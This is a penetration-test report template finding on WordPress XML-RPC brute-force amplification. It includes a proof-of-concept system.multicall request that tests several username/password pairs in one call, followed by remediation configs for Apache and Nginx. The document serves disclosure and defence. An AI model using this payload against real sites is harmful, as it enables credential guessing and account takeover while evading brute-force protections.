---
category: "APP-VUL"
cvss: "7.5"
report_on_external_network_test: true
---
### WordPress XML-RPC API Brute Force Amplification Attack
The WordPress XML-RPC application programming interface (API) is enabled on the affected website{s||} and is available at the following URL{s||}, which {are||is} vulnerable to brute force amplification attacks against user credentials:

http://SITE/xmlrpc.php

When a specially crafted request with multiple combinations of the same username and different passwords is sent, this interface will display whether the credentials are valid. {==OPTION==}Please note that as it is possible to obtain a list of valid WordPress usernames due to a usernames enumeration attack (see section {==XREF==}), an attacker can use this interface to launch a brute-force attack against users' passwords.

The following proof of concept example shows how an attacker can use the default system.multicall method to brute force WordPress logins. In the following example, two incorrect username/password combinations were sent. However, this was tested with up to 10 simultaneous credentials.

POST {==URL==}
```
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall><methodName>system.multicall</methodName>
<params>
<param>
<value>
<array><data>
    <value><struct>     <member><name>methodName</name><value><string>wp.getCategories</string></value></member>
        <member><name>params</name><value><array><data>
            <value><string>dionach</string></value>
            <value><string>invalid-password</string></value>
        </data></array></value></member>
    </struct></value>
    <value><struct>        <member><name>methodName</name><value><string>wp.getCategories</string></value></member>
        <member><name>params</name><value><array><data>
            <value><string>dionach</string></value>
            <value><string>{==masked valid password==}</string></value>
        </data></array></value></member>
    </struct></value>
</data></array></value></param>
</params></methodCall>
```
The server response indicates that the credentials supplied in the first method were invalid, while the credentials in the second method were valid.

{==Server response showing success and failure==}
Attackers can leverage the system.multicall method to attempt to guess a large number of passwords with just one HTTP request against the WordPress application, bypassing security tools that are designed to look for and block brute force attempts.

Please note that other default WordPress methods can be used to initiate this attack.
#### Impact: Medium
An attacker who manages to obtain valid credentials could gain access to user accounts and the personal information tied to them. Furthermore, if the credentials belong to an administrative user, the attacker could take administrative control of the website.
#### Likelihood: Medium
An attacker will require knowledge of usernames{==OPTION:, which is possible due to the user enumeration issue (see section XREF)==}. Users would also need to use fairly weak passwords, such as dictionary words or common names.
#### Recommendation
If the XML-RPC interface is not used, consider disabling it. This can be done either via WordPress plugins or by using the web server to restrict access to the "xmlrpc.php" file.

{==OPTION Apache:==} For Apache, the following configuration will deny access to the "xmlrpc.php" file:

```
<Files xmlrpc.php>
Deny from all
</Files>
```

{==OPTION Nginx:==} For Nginx, the following configuration will deny access to the "xmlrpc.php" file:

```
location = /xmlrpc.php {
   deny all;
   access_log off;
   log_not_found off;
}
```

Alternatively, plugins such as WordFence allow configuring how many attempts are allowed before blocking such requests.

Finally, the use of the system.multicall method can be blocked, for example by using a web application firewall that has this functionality. However, note that this may not stop an attacker from using single method requests to bypass other brute force protections such as CAPTCHA mechanisms.